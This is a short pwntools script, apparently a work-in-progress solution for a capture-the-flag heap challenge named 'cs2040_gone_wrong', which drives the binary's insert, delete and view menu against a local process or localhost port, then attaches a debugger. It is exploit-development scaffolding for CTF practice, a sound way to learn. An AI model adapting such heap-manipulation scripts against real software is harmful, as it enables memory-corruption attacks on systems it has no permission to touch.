from pwn import *

context.terminal = ["cmd.exe", "/c", "wt.exe", "nt", "-H", "wsl.exe", "--", "sh", "-c"]

if args.REMOTE:
    p = remote('localhost', 5003)
else:
    p = process('./dist/cs2040_gone_wrong.o', env = {'LD_PRELOAD': './dist/libc-2.27.so'})

def insert(v):
    p.sendlineafter('Option: ', '1')
    p.sendlineafter('Node Value: ', str(v))


def delete(v):
    p.sendlineafter('Option: ', '2')
    p.sendlineafter('Node Value: ', str(v))

def view():
    p.sendlineafter('Option: ', '3')
    return p.recvline()

insert(0x100)

insert(0x50)
insert(0x35)
insert(0x70)

insert(0x105)


info(view())

gdb.attach(p)
delete(0x35)
delete(0)
insert(0x1000)
insert(0x1000)

p.interactive()
